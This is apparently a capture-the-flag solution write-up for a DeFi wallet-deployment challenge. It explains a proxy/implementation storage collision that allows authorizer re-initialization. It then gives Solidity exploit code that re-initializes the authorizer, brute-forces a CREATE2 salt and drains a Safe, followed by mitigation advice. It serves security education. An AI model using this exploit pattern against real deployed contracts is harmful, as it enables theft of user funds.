# Wallet Mining - Solution

## Challenge Overview

A wallet deployment system incentivizes creating Safe wallets by paying 1 DVT per deployment. The system includes:
- **WalletDeployer**: Pays rewards for authorized deployments
- **AuthorizerUpgradeable**: Controls who can deploy and where
- **TransparentProxy**: Proxies the authorizer with an upgrader role

A user sent 20M DVT to address `0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496` expecting their Safe wallet to be deployed there, but the nonce was lost.

**Goal:** Recover all funds in a single transaction

## The Vulnerability

### Storage Collision Between Proxy and Implementation

The `TransparentProxy` declares:
```solidity
address public upgrader = msg.sender;  // Stored at slot 0
```

The `AuthorizerUpgradeable` declares:
```solidity
uint256 public needsInit = 1;  // Also at slot 0!
mapping(address => mapping(address => uint256)) private wards;  // slot 1
```

**The collision**: When functions are called through the proxy:
- Slot 0 contains the `upgrader` address (non-zero after deployment)
- But `needsInit` reads from slot 0

Since `upgrader != 0`, the check `needsInit != 0` passes, allowing us to call `init()` again!

### The Exploit

```solidity
// After deployment, slot 0 = upgrader address (non-zero)
// This check passes because needsInit reads slot 0 (upgrader address)!
require(needsInit != 0, "cannot init");  // ✓ Passes!

// We can add ourselves as an authorized ward
authorizer.init([attacker], [USER_DEPOSIT_ADDRESS]);
```

## Exploit Strategy

1. **Re-initialize authorizer**: Call `init()` to add attacker as authorized for USER_DEPOSIT_ADDRESS
2. **Find the nonce**: Brute force to find the salt that creates a Safe at the expected address
3. **Deploy the Safe**: Call `walletDeployer.drop()` to deploy and receive 1 DVT reward
4. **Drain the Safe**: Execute a transfer transaction from the Safe (signed by user)
5. **Pay the ward**: Send the reward to the original ward

## Solution Code

```solidity
function test_walletMining() public checkSolvedByPlayer {
    // Pre-compute the Safe transaction hash for signing
    bytes memory transferCall = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
    
    // Compute EIP-712 domain separator and transaction hash
    bytes32 domainSeparator = keccak256(abi.encode(
        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
        block.chainid,
        USER_DEPOSIT_ADDRESS
    ));

    bytes32 safeTxHash = keccak256(abi.encode(
        SAFE_TX_TYPEHASH, address(token), 0, keccak256(transferCall),
        uint8(Enum.Operation.Call), 0, 0, 0, address(0), address(0), 0
    ));

    bytes32 txHash = keccak256(abi.encodePacked(
        bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash
    ));

    // Sign with user's private key
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    // Deploy attacker
    new WalletMiningAttacker(
        walletDeployer, authorizer, proxyFactory, singletonCopy,
        token, user, ward, transferCall, signature
    );
}

contract WalletMiningAttacker {
    constructor(...) {
        // 1. Exploit storage collision
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(wards, aims);  // Works due to storage collision!

        // 2. Build Safe initializer
        address[] memory owners = new address[](1);
        owners[0] = user;
        bytes memory initializer = abi.encodeCall(Safe.setup, (...));

        // 3. Find nonce via brute force
        uint256 saltNonce = _findNonce(proxyFactory, singletonCopy, initializer);

        // 4. Deploy Safe and get reward
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce);

        // 5. Execute transfer from Safe
        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(..., signature);

        // 6. Send reward to ward
        token.transfer(ward, token.balanceOf(address(this)));
    }
}
```

## Nonce Mining

The Safe address is determined by:
```
address = CREATE2(factory, salt, proxy_code)
salt = keccak256(keccak256(initializer) || nonce)
```

We iterate through nonces until we find one producing `USER_DEPOSIT_ADDRESS`:

```solidity
function _findNonce(...) internal pure returns (uint256) {
    bytes32 initHash = keccak256(initializer);
    for (uint256 i = 0; i < 100; i++) {
        bytes32 salt = keccak256(abi.encodePacked(initHash, i));
        if (_computeAddress(factory, salt, singleton) == USER_DEPOSIT_ADDRESS) {
            return i;
        }
    }
    revert("nonce not found");
}
```

## Attack Flow

```
Player deploys WalletMiningAttacker (single transaction)
    │
    ├── 1. authorizer.init([attacker], [USER_DEPOSIT_ADDRESS])
    │       └── Storage collision allows re-initialization!
    │
    ├── 2. Find nonce via brute force
    │       └── Salt 13 produces USER_DEPOSIT_ADDRESS
    │
    ├── 3. walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, 13)
    │       ├── Deploys Safe at USER_DEPOSIT_ADDRESS
    │       └── Attacker receives 1 DVT reward
    │
    ├── 4. Safe.execTransaction(token.transfer(user, 20M))
    │       └── 20M DVT → user
    │
    └── 5. token.transfer(ward, 1 DVT)
            └── Reward → ward
```

## Mitigation Recommendations

1. **Proper storage layout**: Use EIP-1967 storage slots for proxy state
   ```solidity
   bytes32 constant UPGRADER_SLOT = keccak256("proxy.upgrader");
   ```

2. **Gap variables**: Add storage gaps in upgradeable contracts
   ```solidity
   uint256[50] private __gap;
   ```

3. **Initialization guards**: Use OpenZeppelin's Initializable properly with state stored in implementation storage

4. **Storage collision checks**: Audit proxy/implementation storage layouts together

